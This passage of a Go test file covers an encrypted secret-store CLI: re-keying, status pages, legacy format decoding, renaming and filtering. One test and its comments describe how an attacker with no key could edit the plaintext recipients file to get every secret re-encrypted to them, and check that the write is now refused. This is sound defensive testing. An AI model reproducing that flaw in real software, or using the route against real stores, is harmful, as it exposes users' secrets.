		t.Errorf("--dry-run changed the lock: %v", specs)
	}
}

// --- kv.recipients cannot rewrite who can read the store ------------------
//
// kv.recipients has to be plaintext, readable without unlocking anything —
// which also makes it a file with no cryptographic tie to the store at all,
// editable by anyone who can write to the data directory without ever
// holding a key. An ordinary write used to trust it completely: whatever it
// said, that is who the whole store got re-encrypted to. Tampering with it
// by hand, with zero decryption capability, was a complete route to reading
// every secret in the store — the moment anyone made an unrelated write.

// The exact attack: no key, no decrypt — just a plaintext file edit, and an
// ordinary write that has nothing to do with it.
func TestATamperedRecipientsFileCannotWidenReadersOnAnOrdinaryWrite(t *testing.T) {
	_, configDir := setupWithConfig(t)
	victim, victimPub := writeSSHKeypair(t, t.TempDir(), "victim")
	_, malloryPub := writeSSHKeypair(t, t.TempDir(), "mallory")

	text(t, runInit, map[string]any{"identity": victim}, false)
	text(t, runSet, map[string]any{"key": "prod-token", "value": "super-secret", "identity": victim}, false)

	// Mallory never touches a key or the ciphertext — only the plaintext
	// file beside it.
	specs, verr := loadRecipients()
	if verr != nil || len(specs) != 1 {
		t.Fatalf("recipients = %v (%v)", specs, verr)
	}
	pub, err := os.ReadFile(malloryPub)
	if err != nil {
		t.Fatal(err)
	}
	if verr := saveRecipients(append(specs, strings.TrimSpace(string(pub)))); verr != nil {
		t.Fatal(verr)
	}

	// An ordinary, unrelated write: nothing about this call mentions
	// recipients, prod-token, or Mallory.
	_, err = runSet(context.Background(), req(map[string]any{
		"key": "unrelated", "value": "v", "identity": victim,
	}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.recipients.mismatch" || ve.Hint == "" {
		t.Fatalf("the tampered file was trusted instead of refused: %+v", ve)
	}

	// Mallory still cannot read anything — the refusal actually stopped the
	// re-encryption, not just the message.
	_, err = runGet(context.Background(), req(map[string]any{"key": "prod-token", "identity": victim}, false))
	if err != nil {
		t.Fatalf("the legitimate owner lost access after a refused write: %v", err)
	}
	_ = configDir
	_ = victimPub
}

// The suggested reconciliation actually reconciles: it clears the mismatch
// and restores ordinary writes, and it is the operator's own explicit,
// confirmed action — not something that happens on their behalf.
func TestRecipientsMismatchIsResolvedByRekey(t *testing.T) {
	setupWithConfig(t)
	victim, victimPub := writeSSHKeypair(t, t.TempDir(), "victim")
	_, malloryPub := writeSSHKeypair(t, t.TempDir(), "mallory")
	text(t, runInit, map[string]any{"identity": victim}, false)
	text(t, runSet, map[string]any{"key": "k", "value": "v", "identity": victim}, false)

	specs, _ := loadRecipients()
	pub, _ := os.ReadFile(malloryPub)
	if verr := saveRecipients(append(specs, strings.TrimSpace(string(pub)))); verr != nil {
		t.Fatal(verr)
	}

	text(t, runRekey, map[string]any{"only": true, "recipient": []string{victimPub}, "identity": victim}, false)

	if _, err := runSet(context.Background(), req(map[string]any{
		"key": "again", "value": "v", "identity": victim,
	}, false)); err != nil {
		t.Fatalf("an ordinary write after reconciling should work: %v", err)
	}
}

// A store written before this field existed has nothing to check against —
// the first write after upgrading must not refuse just because there is no
// history yet, and it has to start keeping one.
func TestNoEmbeddedRecipientsIsNotTreatedAsAMismatch(t *testing.T) {
	setupWithConfig(t)
	victim, _ := writeSSHKeypair(t, t.TempDir(), "victim")
	text(t, runInit, map[string]any{"identity": victim}, false)

	// Simulate a pre-fix store: strip the embedded record a real write would
	// have left, the same shape as ciphertext from before this field existed.
	s, verr := load(req(map[string]any{"identity": victim}, false))
	if verr != nil {
		t.Fatal(verr)
	}
	s.Recipients = nil
	recipients, _, _, verr := writeKeys(req(map[string]any{"identity": victim}, false), nil)
	if verr != nil {
		t.Fatal(verr)
	}
	if verr := saveTo(s, recipients, nil); verr != nil {
		t.Fatal(verr)
	}

	if _, err := runSet(context.Background(), req(map[string]any{
		"key": "k", "value": "v", "identity": victim,
	}, false)); err != nil {
		t.Fatalf("a legacy store with no embedded record was refused instead of migrated: %v", err)
	}

	// And now that the first write has embedded a record, it is enforced.
	specs, _ := loadRecipients()
	if verr := saveRecipients(append(specs, "ssh-ed25519 AAAAforged forged")); verr != nil {
		t.Fatal(verr)
	}
	_, err := runSet(context.Background(), req(map[string]any{
		"key": "k2", "value": "v", "identity": victim,
	}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.recipients.mismatch" {
		t.Errorf("migration did not start enforcing on the next write: %+v", ve)
	}
}

// A passphrase store is a store like any other: it re-keys to a key you hold.
func TestRekeyMovesAPassphraseStoreToAKey(t *testing.T) {
	setupWithConfig(t)
	private, _ := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t"}, false)

	text(t, runRekey, map[string]any{"only": true, "recipient": []string{private + ".pub"}, "identity": private}, false)

	if _, err := runList(context.Background(), req(nil, false)); err == nil {
		t.Error("the passphrase still opens it")
	}
	v, err := runGet(context.Background(), req(map[string]any{"key": "token", "identity": private}, false))
	if err != nil || v.(view.Text).Body != "s3cr3t" {
		t.Errorf("the key does not open it: %v %v", v, err)
	}
}

// Writing an entry must never change who can read the store — that is the
// whole reason `kv set` is a write and `kv rekey` is destructive.
func TestSetCannotChangeTheLock(t *testing.T) {
	setupWithConfig(t)
	private, _ := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)

	_, err := runSet(context.Background(), req(map[string]any{
		"key": "k2", "value": "v2", "identity": private,
	}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.identity.wrongmode" || !strings.Contains(ve.Hint, "rekey") {
		t.Fatalf("err = %+v, want the flag to be refused rather than ignored", ve)
	}
	if specs, _ := loadRecipients(); len(specs) != 0 {
		t.Errorf("a write changed the recipients: %v", specs)
	}
}

// A passphrase-protected SSH key is where people reach for ssh-agent, which
// cannot help — the refusal has to say so rather than let them try.
func TestLockedKeyExplainsThatTheAgentCannotHelp(t *testing.T) {
	setupWithConfig(t)
	keys := t.TempDir()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	_ = pub
	block, err := ssh.MarshalPrivateKeyWithPassphrase(priv, "", []byte("locked"))
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(keys, "id_locked")
	if err := os.WriteFile(path, pem.EncodeToMemory(block), 0o600); err != nil {
		t.Fatal(err)
	}
	_, verr := parseIdentities(plugin.NewRequest(nil, false, false), path)
	if verr == nil || verr.Code != "kv.identity.locked" {
		t.Fatalf("verr = %+v", verr)
	}
	if !strings.Contains(verr.Hint, "ssh-agent") {
		t.Errorf("hint does not mention the agent: %q", verr.Hint)
	}
}

// statusSections runs kv.status as a full page.
func statusSections(t *testing.T, values map[string]any) view.Sections {
	t.Helper()
	if values == nil {
		values = map[string]any{}
	}
	values["detail"] = true
	v, err := runStatus(t.Context(), req(values, false))
	if err != nil {
		t.Fatal(err)
	}
	s, ok := v.(view.Sections)
	if !ok {
		t.Fatalf("detailed status = %s, want Sections", view.TypeOf(v))
	}
	return s
}

func section(t *testing.T, s view.Sections, title string) view.View {
	t.Helper()
	for _, item := range s.Items {
		if item.Title == title {
			return item.View
		}
	}
	t.Fatalf("no %q section: %v", title, sectionTitles(s))
	return nil
}

func sectionTitles(s view.Sections) []string {
	out := make([]string, 0, len(s.Items))
	for _, item := range s.Items {
		out = append(out, item.Title)
	}
	return out
}

// The detail page answers "what is in here", which the compact one cannot:
// the inventory needs the store open, and the compact view promises never to
// need that.
func TestDetailedStatusListsWhatIsInTheStore(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "db-password", "value": "s3cr3t", "description": "staging"}, false)

	s := statusSections(t, nil)
	if _, ok := section(t, s, "store").(view.KeyValue); !ok {
		t.Error("the store section should be the same summary the compact view returns")
	}
	tbl, ok := section(t, s, "keys").(view.Table)
	if !ok {
		t.Fatalf("keys section = %s, want Table", view.TypeOf(section(t, s, "keys")))
	}
	found := false
	for _, row := range tbl.Rows {
		if row[0] == "db-password" {
			found = true
		}
	}
	if !found {
		t.Errorf("inventory does not list the stored key: %v", tbl.Rows)
	}
}

// The inventory is only safe to put on a status page because of what it
// leaves out. A value reaching this page — in any section, at any depth —
// turns "where is my store" into "here are my secrets".
func TestDetailedStatusNeverShowsAValue(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "db-password", "value": "s3cr3t-value", "description": "staging"}, false)
	text(t, runSet, map[string]any{"key": "api-token", "value": "tok-abcdef", "description": "prod"}, false)

	rendered := fmt.Sprintf("%+v", statusSections(t, nil))
	for _, secret := range []string{"s3cr3t-value", "tok-abcdef"} {
		if strings.Contains(rendered, secret) {
			t.Fatalf("the detailed status page leaked %q", secret)
		}
	}
}

// A status page that blocks on a passphrase is not a status page. With no
// key available the inventory section says so and the rest of the page still
// renders — the compact answer must never become a prompt.
func TestDetailedStatusSaysSoWhenItCannotOpenTheStore(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "db-password", "value": "s3cr3t"}, false)

	v, err := runStatus(t.Context(), plugin.NewRequest(map[string]any{"detail": true}, false, false))
	if err != nil {
		t.Fatalf("a locked store must still produce a status page: %v", err)
	}
	s, ok := v.(view.Sections)
	if !ok {
		t.Fatalf("detailed status = %s, want Sections", view.TypeOf(v))
	}
	if _, ok := section(t, s, "store").(view.KeyValue); !ok {
		t.Error("the store section must render even when the inventory cannot")
	}
	txt, ok := section(t, s, "keys").(view.Text)
	if !ok {
		t.Fatalf("keys section = %s, want an explanation", view.TypeOf(section(t, s, "keys")))
	}
	if !strings.Contains(txt.Body, "Locked") {
		t.Errorf("the explanation should say the store is locked: %q", txt.Body)
	}
}

// Every store written before entry.Value became []byte encodes its values as
// plain JSON strings. Reading one as base64 fails outright — which is how an
// upgrade turned a working store into "illegal base64 data at input byte 0"
// and locked every secret in it behind a parse error.
func TestLegacyStoreValuesAreStillReadable(t *testing.T) {
	legacy := []byte(`{"entries":{
		"db-password":{"value":"hunter2","description":"staging","kind":"string",
			"created":"2026-01-02T03:04:05Z","updated":"2026-01-02T03:04:05Z"},
		"binary-ish":{"value":"not/valid/base64!!","kind":"string",
			"created":"2026-01-02T03:04:05Z","updated":"2026-01-02T03:04:05Z"}
	}}`)
	s, verr := decodeStore(legacy)
	if verr != nil {
		t.Fatalf("a legacy store must still open: %v", verr)
	}
	if got := string(s.Entries["db-password"].Value); got != "hunter2" {
		t.Errorf("value = %q, want the original string", got)
	}
	if got := string(s.Entries["binary-ish"].Value); got != "not/valid/base64!!" {
		t.Errorf("value = %q", got)
	}
	if got := s.Entries["db-password"].Description; got != "staging" {
		t.Errorf("legacy metadata was dropped: description = %q", got)
	}
	if s.Entries["db-password"].Created.IsZero() {
		t.Error("legacy timestamps were dropped")
	}
}

// The current format must keep winning: base64 values are decoded as bytes,
// not handed back as the base64 text that encodes them.
func TestCurrentStoreStillDecodesAsBytes(t *testing.T) {
	current := []byte(`{"version":2,"entries":{"k":{"value":"aHVudGVyMg==",` +
		`"created":"2026-01-02T03:04:05Z","updated":"2026-01-02T03:04:05Z"}}}`)
	s, verr := decodeStore(current)
	if verr != nil {
		t.Fatal(verr)
	}
	if got := string(s.Entries["k"].Value); got != "hunter2" {
		t.Errorf("value = %q, want the decoded bytes", got)
	}
}

func TestGarbageIsStillACorruptStore(t *testing.T) {
	if _, verr := decodeStore([]byte("this is not JSON at all")); verr == nil {
		t.Fatal("garbage must not parse as either format")
	} else if verr.Code != "kv.store.corrupt" {
		t.Errorf("code = %q", verr.Code)
	}
}

// Reading a legacy store is a guess made once: the write that follows stamps
// the format, so the guess never has to be made about this store again. A
// value that survives that round trip byte for byte is the proof.
func TestALegacyStoreIsStampedOnTheNextWrite(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "hunter2"}, false)

	s, verr := load(req(nil, false))
	if verr != nil {
		t.Fatal(verr)
	}
	if s.Version != storeVersion {
		t.Errorf("version = %d, want %d", s.Version, storeVersion)
	}
	if got := string(s.Entries["k"].Value); got != "hunter2" {
		t.Errorf("value = %q", got)
	}
}

// --- Renaming, filtering, counting ------------------------------------------

// Renaming used to be `kv get` piped into `kv set` and then `kv rm`: two
// grants, and the secret itself sitting in shell history at the join. The
// entry moves inside the store instead, and everything that is not its name
// travels with it.
func TestRenameKeepsTheValueAndEverythingKnownAboutIt(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{
		"key": "old-token", "value": "s3cr3t", "description": "staging API",
	}, false)
	before := storedEntry(t, "old-token")

	body := text(t, runRename, map[string]any{"key": "old-token", "new-name": "staging-token"}, false)

	if got := text(t, runGet, map[string]any{"key": "staging-token"}, false); got != "s3cr3t" {
		t.Errorf("value under the new name = %q", got)
	}
	if _, err := runGet(context.Background(), req(map[string]any{"key": "old-token"}, false)); err == nil {
		t.Error("the old name still resolves")
	}
	after := storedEntry(t, "staging-token")
	if after.Description != "staging API" {
		t.Errorf("description = %q", after.Description)
	}
	// A name is not a rotation. `kv list`'s Updated column is the one place a
	// token that has been sitting there for fourteen months is visible, and a
	// rename that reset it would answer "just now" to the only question that
	// column exists to answer.
	if !after.Updated.Equal(before.Updated) || !after.Created.Equal(before.Created) {
		t.Errorf("timestamps moved: %v/%v, want %v/%v",
			after.Created, after.Updated, before.Created, before.Updated)
	}
	if strings.Contains(body, "s3cr3t") {
		t.Errorf("the confirmation printed the value: %q", body)
	}
}

// Renaming onto an existing key would destroy the secret in it with no
// history and no undo — kv.rm's question — and a grant scoped to the key
// being renamed says nothing at all about the one being clobbered.
func TestRenameRefusesToClobberAnExistingKey(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "staging", "value": "staging-secret"}, false)
	text(t, runSet, map[string]any{"key": "prod", "value": "prod-secret"}, false)

	_, err := runRename(context.Background(), req(map[string]any{"key": "staging", "new-name": "prod"}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.rename.taken" {
		t.Fatalf("clobbering rename = %+v", ve)
	}
	if !strings.Contains(ve.Hint, "kv rm") {
		t.Errorf("hint does not name the command that does ask: %q", ve.Hint)
	}
	if got := text(t, runGet, map[string]any{"key": "prod"}, false); got != "prod-secret" {
		t.Fatalf("the target secret was destroyed: %q", got)
	}
	if got := text(t, runGet, map[string]any{"key": "staging"}, false); got != "staging-secret" {
		t.Errorf("the source was moved anyway: %q", got)
	}
}

func TestRenameDryRunMovesNothing(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "old", "value": "s3cr3t"}, false)

	body := text(t, runRename, map[string]any{"key": "old", "new-name": "new"}, true)

	if !strings.HasPrefix(body, "would rename") {
		t.Errorf("dry run = %q", body)
	}
	if got := text(t, runGet, map[string]any{"key": "old"}, false); got != "s3cr3t" {
		t.Errorf("a dry run moved the entry: %q", got)
	}
	if _, err := runGet(context.Background(), req(map[string]any{"key": "new"}, false)); err == nil {
		t.Error("a dry run created the new name")
	}
}

func TestRenameToTheSameNameIsCoded(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t"}, false)
	_, err := runRename(context.Background(), req(map[string]any{"key": "token", "new-name": "token"}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.rename.samename" {
		t.Errorf("rename onto itself = %+v", ve)
	}
}

// The name is the half you have forgotten. "Which one was the deploy key for
// the staging cluster" is answerable from what you wrote down at the time and
// not from `ci-2`, so the description is searched too — and never printed as
// anything but the description, which kv.list already shows.
func TestListMatchesDescriptionsAsWellAsNames(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "ci-2", "value": "v", "description": "AWS deploy key, staging"}, false)
	text(t, runSet, map[string]any{"key": "aws-root", "value": "v", "description": "billing only"}, false)
	text(t, runSet, map[string]any{"key": "gh-token", "value": "v"}, false)

	tbl := table(t, runList, map[string]any{"match": "AWS"})
	if len(tbl.Rows) != 2 {
		t.Fatalf("match aws = %v, want the name and the description hit", tbl.Rows)
	}
	// Case-insensitive: nobody remembers whether they wrote AWS or aws.
	if tbl.Rows[0][col(t, tbl, "Key")] != "aws-root" || tbl.Rows[1][col(t, tbl, "Key")] != "ci-2" {
		t.Errorf("match aws = %v", tbl.Rows)
	}
	if len(table(t, runList, map[string]any{"match": "staging", "kind": "string"}).Rows) != 1 {
		t.Error("--match and --kind do not narrow together")
	}
}

// "No keys stored yet — add one with…" sent people off to re-add a secret
// that was there all along, one filter away.
func TestAnEmptyListSaysWhichKindOfEmptyItIs(t *testing.T) {
	setup(t)
	if got := emptyList(0, "", ""); !strings.Contains(got, "No keys stored yet") {
		t.Errorf("empty store = %q", got)
	}
	got := emptyList(4, "json", "aws")
	for _, want := range []string{"of kind json", `matching "aws"`, "holds 4 keys"} {
		if !strings.Contains(got, want) {
			t.Errorf("filtered empty = %q, want it to mention %q", got, want)
		}
	}
	if got := emptyList(1, "json", ""); !strings.Contains(got, "holds 1 key") {
		t.Errorf("one stored key = %q", got)
	}
}

// "locked to 1 key(s)" is the shape of message that gets written once and
// read every day. A store whose status line cannot count is not the thing to
// look careless about.
func TestNothingCountsWithParenthesisedPlurals(t *testing.T) {
	setupWithConfig(t)
	text(t, runInit, map[string]any{"generate": true}, false)

	v, err := runStatus(context.Background(), plugin.NewRequest(nil, false, false))
	if err != nil {
		t.Fatal(err)
	}
	if got := pairValue(v.(view.KeyValue), "locked to"); !strings.HasPrefix(got, "1 key —") {
		t.Errorf("locked to = %q", got)
	}
	if got := plural(2, "reader"); got != "2 readers" {
		t.Errorf("plural(2, reader) = %q", got)
	}
	// The -y rule, the only one that comes up.
	if got := plural(2, "identity"); got != "2 identities" {
		t.Errorf("plural(2, identity) = %q", got)
	}
}

// A folder is what names share, not a thing that is stored. The grant
// vocabulary rests on that: a scope ending in "/" covers the records under it,
// so a *record* by that name would be covered exactly and as a prefix at once,
// and no reader could tell which a grant meant.
func TestAKeyCannotBeNamedLikeAFolder(t *testing.T) {
	for _, key := range []string{"prod/", "prod/eu/", "/"} {
		if verr := checkKeyName(key); verr == nil {
			t.Errorf("%q was accepted as an entry name", key)
		} else if verr.Code != "kv.set.foldername" {
			t.Errorf("%q refused as %s, want kv.set.foldername", key, verr.Code)
		}
	}
	// And the folder convention itself stays free: these are ordinary names.
	for _, key := range []string{"prod/db-password", "prod/eu/db-password", "db-password", "prod"} {
		if verr := checkKeyName(key); verr != nil {
			t.Errorf("%q was refused: %v", key, verr)
		}
	}
}
